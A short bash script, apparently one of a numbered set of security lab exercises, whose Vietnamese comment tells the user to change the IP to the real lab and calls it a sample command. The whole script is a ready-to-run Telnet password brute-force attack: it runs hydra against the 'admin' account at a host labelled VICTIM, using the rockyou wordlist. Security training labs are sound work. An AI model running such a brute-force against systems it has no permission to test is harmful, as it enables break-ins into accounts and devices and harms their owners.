#!/bin/bash
# 09-telnet-bruteforce — SUA IP cho dung lab that truoc khi chay. Day la lenh mau.
VICTIM="192.168.100.20"
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://"$VICTIM"
